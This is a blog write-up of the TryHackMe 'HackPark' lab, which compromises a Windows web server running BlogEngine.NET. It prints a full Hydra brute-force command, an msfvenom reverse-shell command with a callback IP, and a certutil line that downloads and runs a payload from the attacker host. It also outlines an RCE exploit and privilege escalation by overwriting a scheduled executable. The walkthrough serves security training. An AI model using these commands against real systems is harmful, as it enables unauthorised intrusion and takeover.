---
title: "TryHackMe - HackPark"
date: 2023-06-28 22:00:00 +/-0500
categories: [Cybersecurity, CTFs, TryHackMe, Windows]
tags:
  [CTF, TryHackMe, cybersecurity, Windows, RCE, Hydra, winPEAS]
---

## Challenge: HackPark

In this box, it introduces Hydra, RCE & WinPEAS tools/techniques to exploit a
Windows System.

## Recon

### NMAP

```
nmap -sC -sV -O -sT 10.10.170.188
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-20 18:27 UTC
Nmap scan report for ip-10-10-170-188.eu-west-1.compute.internal (10.10.170.188)
Host is up (0.00068s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-robots.txt: 6 disallowed entries
| /Account/*.* /search /search.aspx /error404.aspx
|_/archive /archive.aspx
|_http-server-header: Microsoft-IIS/8.5
|_http-title: hackpark | hackpark amusements
| http-methods:
|_  Potentially risky methods: TRACE
3389/tcp open  ssl/ms-wbt-server?
|_ssl-date: 2023-06-20T18:28:29+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=hackpark
| Not valid before: 2023-06-19T18:14:25
|_Not valid after:  2023-12-19T18:14:25
| rdp-ntlm-info:
|   Target_Name: HACKPARK
|   NetBIOS_Domain_Name: HACKPARK
|   NetBIOS_Computer_Name: HACKPARK
|   DNS_Domain_Name: hackpark
|   DNS_Computer_Name: hackpark
|   Product_Version: 6.3.9600
|_  System_Time: 2023-06-20T18:28:24+00:00
MAC Address: 02:51:BA:0B:1C:1B (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2012:r2
Aggressive OS guesses: Microsoft Windows Server 2012 or Windows Server 2012 R2 (89%), Microsoft Windows Server 2012 R2 (89%), Microsoft Windows Server 2012 (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.85 seconds

```

Port 80 runs Microsoft HTTPAPI httpd 2.0. Also, port 3389 indicates that once
we get the cred to get onto the target machine we can remotely access it by
using `xfreerdp` or `rdesktop`.

## Attacking the login page

The official write-up takes me to the login page of the website. After finding a login
page, we need to identify what type of requests the form makes to the webserver.
Typically, web servers make two types of requests, a `GET` request which is used
to request data from a webserver and a `POST` request which is used to send data
to a server.

We can check which request is made when a form is submitted by inspecting HTML
elements. Once we know the URL for the login form and the type of request being
made, we can start the brute-force attack on an account.

When I clicked on the login page link, the URL changed to
`http://10.10.170.188/Account/login.aspx?ReturnURL=/admin/`. Because of this, I
would try the brute-force attack on the admin account first. To do this, we can
use `hydra` which is a login cracker.

`hydra -l <username> -P <path_to_wordlist> <ip> http-post-form`

So first, I tried `hydra -l admin -P <path_to_wordlist> 10.10.170.188
http-post-form`, but it was not working. I had to look up what I was doing
wrong, then I found out from [this
article](https://it-tfuerst.de/2021/02/06/hackpark-write-up-medium-level/) that,
in order to to an attack on a login form, we need to know the following
parameters: Hostname/IP, Login Page URL, Request Body, and Error Message.

`hydra -L <USER> -P <Password> <ip> http-post-form “<Login Page>:<Request
Body>:<Error Message>”`


This is the `“<Login Page>:<Request Body>:<Error Message>”` part I crafted. Make
sure that contents are separated using `:`.

```
"/Account/login.aspx:__VIEWSTATE=vTEGEhWaMSkYpJxnYRcsEwldVEjlvYM6WqpOAx1NfYQPxNyQ4zXFXr%2Fza5tvCHi1SM306YGu4Uc7qGyMC9pJ%2B%2FRQEBzzBUsho4whVX4CbhZzzY%2Fsb8Ww76WQu8cHpvppQ7gBCSiYWGMzwJDnJ8BWIXo73peBkzDqZdIWRI1bc6bUJWzziTgItFwPLC3IarpP8JgqnRk5UrUPNDfiG8ZxiGiGCUxWVUUJ7CdG6EwYNPYDIAcMWcUjFWb2A7iG8ru%2F0BtNKQOVMbv%2BUouXMj3MHFTYC%2FWQv21ZPQF0JNqP7B8YAixf1YPbVX0IQGSfJKujS5ujkr2iZo8GCRslsnbQlHetNZKvVSwqNDZTT0CUcmnKNr%2BO&__EVENTVALIDATION=luSIModQouaXwBUZ3ewZVbYRemGqC%2Bqshym%2FHORkGPw9mj66TR3pzV8n9i3EYgjEY8DiHt%2By0Bubsj5nBrvl5LcfglN2%2Fdh%2FtCUjyzUquslWipgaKmftx3r9ErXuD%2FK2t0vBkGh1UiG16TGFyA9TLlC%2BPLnew%2F0vW39dssS%2FveOZ7fEx&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login
failed"
```

The 'VIEWSTATE' part is from the request payload you can see from the inspector
of your web-browser.

The command I used:

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.170.188
http-post-form
"/Account/login.aspx:__VIEWSTATE=vTEGEhWaMSkYpJxnYRcsEwldVEjlvYM6WqpOAx1NfYQPxNyQ4zXFXr%2Fza5tvCHi1SM306YGu4Uc7qGyMC9pJ%2B%2FRQEBzzBUsho4whVX4CbhZzzY%2Fsb8Ww76WQu8cHpvppQ7gBCSiYWGMzwJDnJ8BWIXo73peBkzDqZdIWRI1bc6bUJWzziTgItFwPLC3IarpP8JgqnRk5UrUPNDfiG8ZxiGiGCUxWVUUJ7CdG6EwYNPYDIAcMWcUjFWb2A7iG8ru%2F0BtNKQOVMbv%2BUouXMj3MHFTYC%2FWQv21ZPQF0JNqP7B8YAixf1YPbVX0IQGSfJKujS5ujkr2iZo8GCRslsnbQlHetNZKvVSwqNDZTT0CUcmnKNr%2BO&__EVENTVALIDATION=luSIModQouaXwBUZ3ewZVbYRemGqC%2Bqshym%2FHORkGPw9mj66TR3pzV8n9i3EYgjEY8DiHt%2By0Bubsj5nBrvl5LcfglN2%2Fdh%2FtCUjyzUquslWipgaKmftx3r9ErXuD%2FK2t0vBkGh1UiG16TGFyA9TLlC%2BPLnew%2F0vW39dssS%2FveOZ7fEx&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login
failed"
```

I was able to get `admin:1qaz2wsx`

## Compromise the machine

Since we have a credential to use, we will use
[exploit-db.com](https://exploit-db.com) to get initial access on the target
machine. #Exploit-db is a #CVE (common vulnerability and exposures) archive of
public exploits and corresponding vulnerable software, developed for the use of
penetration testers and vulnerability researches (owned by Offensive Security).

So, if we login using the admin credential, we can see that the service is
`blogengine.net` with version 3.3.6.0. Let's search for some exploits using
`searchsploit`.

[This exploit](https://www.exploit-db.com/exploits/46353) is simple enough
to follow. The instruction tells me how to upload a file to the existing
post - download the .cs file provided and modify it so it includes our
machine (or the attacker's machine IP address and the port) and rename it to
PostView.ascx. Then finally go to the address
`http://<IP>/?theme=../../App_Data/files`. If everything is done properly,
your `nc` listener should have the connection.

## Windows Privilege Escalation

Although we have a shell, the shell behaves abnormally. So, we would need to
upload a shell generated by msfvenom then use that shell to have a stable
connection.

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.14.223 LPORT=2345 -f exe
-o rev.exe` will get us the reverse shell. And we will move this onto the victim
machine by running `certutil.exe -urlcache -split -f
"http://10.13.14.223:8000/rev.exe" %tmp%\rev.exe`. This will put the file onto
`C:\Windows\Temp` directory.

Running `rev.exe` will give us a better shell on `nc` listener 2345.

The next question asks what is the name of the abnormal service running. In
order to find out about this, moving `WinPEAS` onto the target machine then have
it enumerate the machine.

After running `WinPEAS`, I looked through the services running on the system and
this one system caught my eye:

```
WindowsScheduler(Splinterware Software Solutions - System Scheduler
Service)[C:\PROGRA~2\SYSTEM~1\WService.exe] - Auto - Running File Permissions:
Everyone [WriteData/CreateFiles] Possible DLL Hijacking in binary folder:
C:\Program Files (x86)\SystemScheduler (Everyone [WriteData/CreateFiles])
```

`WindowsScheduler` file permission is `Everyone` and it says `Possible DLL
Hijacking in binary folder`.

Let's move into the directory then. In the binary folder, you can see a few
`.dll` files. However, the module's question asks what the name of the binary we
are supposed to exploit. So I would assume that would be scheduler.exe or
wscheduler.exe, but they were not. The hint suggest to look at the log of this
abnormal service. I moved into `Events` directory and I found out this file
`<whatever the number was>.INI_LOG.txt`.

The parts of the log shows:

```
06/20/23 20:30:33,Process Ended. PID:1848,ExitCode:4,Message.exe
(Administrator) 06/20/23 20:31:01,Event Started Ok, (Administrator) 06/20/23
20:31:33,Process Ended. PID:848,ExitCode:4,Message.exe (Administrator) 06/20/23
20:32:01,Event Started Ok, (Administrator) 06/20/23 20:32:33,Process Ended.
PID:2376,ExitCode:4,Message.exe (Administrator) 06/20/23 20:33:01,Event Started
Ok, (Administrator) 06/20/23 20:33:33,Process Ended.
PID:1636,ExitCode:4,Message.exe (Administrator)
```

It runs `Message.exe`! This suggests that if we can overwrite this file with our
own executable (with the same name), we can run that executable as the
Administrator privilege.

I crafted a new reverse shell with a different port number and moved that shell
into the directory (also changed the name of the shell to `Message.exe`). A few
moments later, I was able to see this:

```
└─$ nc -lnvp 5678 listening on [any] 5678 ... connect to [10.13.14.223] from
(UNKNOWN) [10.10.123.161] 49339 Microsoft Windows [Version 6.3.9600] (c) 2013
Microsoft Corporation. All rights reserved.

C:\PROGRA~2\SYSTEM~1>dir dir Volume in drive C has no label. Volume Serial
Number is 0E97-C552

Directory of C:\PROGRA~2\SYSTEM~1

```

With this new connection with escalated privilege, I was able to get the user
flag and the root flag.

---

Another interesting Windows box with using different tools to exploit a system.


